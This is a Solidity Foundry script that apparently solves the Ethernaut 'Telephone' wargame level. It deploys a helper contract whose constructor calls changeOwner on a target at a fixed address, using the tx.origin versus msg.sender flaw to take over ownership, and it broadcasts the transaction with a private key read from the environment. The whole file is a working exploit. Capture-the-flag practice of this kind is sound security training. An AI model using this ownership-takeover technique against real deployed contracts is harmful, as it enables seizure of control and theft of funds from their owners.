// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TelephoneHack {
    constructor(Telephone _telephoneContract, address _owener) {
        _telephoneContract.changeOwner(_owener);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephoneContract =
        Telephone(payable(0x8E24eAfb135514816CB1CCbA1e037ae0aea37f40));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TelephoneHack(telephoneContract, vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
